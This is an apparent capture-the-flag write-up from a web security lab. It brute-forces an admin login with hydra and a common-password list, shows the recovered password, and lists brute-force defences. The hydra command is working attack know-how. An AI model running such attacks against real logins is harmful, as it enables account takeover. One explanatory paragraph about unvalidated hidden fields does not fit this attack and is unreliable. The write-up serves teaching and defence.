# Bruteforce(member)

From coookies we know for sure that there is a user with login `admin`. Let's try to bruteforce the password for it.
[Here](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) we have the most common passwords.

We use `hydra` to iterate through them:

```
daiseed@DESKTOP:~/darkly$ hydra -l admin -P ./500-worst-passwords.txt -F 192.168.31.135 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-18 01:03:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
[DATA] attacking http-get-form://192.168.31.135:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
[80][http-get-form] host: 192.168.31.135   login: admin   password: shadow
[STATUS] attack finished for 192.168.31.135 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-18 01:03:43
```

We have admin's password: `shadow`

Input `admin:shadow` into Login page and we have our flag

## Explanation

Attack type: [Brute force attack](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

> A common threat web developers face is a password-guessing attack known as a brute force attack. A brute-force attack is an attempt to discover a password by systematically trying every possible combination of letters, numbers, and symbols until you discover the one correct combination that works. If your web site requires user authentication, you are a good target for a brute-force attack.

Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.

## How to fix it

Below are several solitions to brute force attack. All of them have their own downsides and limitations, attackers can often circumvent many of these techniques by themselves, but by combining several techniques, you can significantly limit brute-force attacks.

1) Lock out accounts after a defined number of incorrect password attempts
2) Since the success of the attack is dependent on time, an easy solution is to inject random pauses when checking a password
3) Lock out an IP address with multiple failed logins
4) Design your Website not to use predictable behavior for failed passwords
5) After one or two failed login attempts, you may want to prompt the user not only for the username and password but also to answer a secret question
6) For advanced users who want to protect their accounts from attack, give them the option to allow login only from certain IP addresses.
7) Assign unique login URLs to blocks of users so that not all users can access the site from the same URL.
8) Use a CAPTCHA to prevent automated attacks
9) Instead of completely locking out an account, place it in a lockdown mode with limited capabilities.

Although brute-force attacks are difficult to stop completely, they are easy to detect because each failed login attempt records an HTTP 401 status code in your Web server logs. It is important to monitor your logfiles for brute-force attacks – in particular, the intermingled 200 statuscodes that mean the attacker found a valid password.